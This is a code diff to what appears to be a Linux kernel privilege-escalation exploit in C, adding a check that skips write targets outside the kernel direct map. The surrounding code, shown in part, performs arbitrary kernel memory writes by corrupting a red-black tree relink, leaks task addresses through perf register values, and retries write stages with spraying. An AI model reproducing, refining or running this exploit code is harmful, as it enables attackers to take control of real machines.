@@ -352,8 +352,18 @@ int run_main_route_threads(void) {
          atomic_load(&consumer_success) > 0 && route_last_step == 0;
 }
 
+/* a target outside the direct map is wrong by construction, so it is worth
+ * neither a spray nor a retry */
+static int in_direct_map(uintptr_t target) {
+  return target > DIRECT_MAP_BASE && target < g_direct_map_end;
+}
+
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
+  if (!in_direct_map(target)) {
+    pr_warning("  target is outside the direct map, not writing\n");
+    return 0;
+  }
   /* Both transports write *(target) := value through the erase left-only
    * relink: waiter words are {pc = value, right = 0, left = target} and
    * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
@@ -822,7 +832,7 @@ static uintptr_t perf_find_task(void) {
           uint64_t v = regs[i];
           /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
           v |= 0x0fULL << 56;
-          if (v > 0xffffff8000000000ULL && v < g_direct_map_end)
+          if (in_direct_map(v))
             cands[nc++] = v;
         }
       }
@@ -1014,6 +1024,13 @@ static int retry_write_stage(
     const char *stage, uintptr_t target, int mode, int attempts,
     useconds_t settle_usec, write_stage_verify_fn verify, void *context,
     int leaf) {
+  /* no attempt can move a target that is wrong by construction, and the
+   * stage belongs in the log with the address rather than the route */
+  if (!in_direct_map(target)) {
+    pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n",
+               stage, target);
+    return 0;
+  }
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
     /* the previous attempt's write can land after its verify read; check
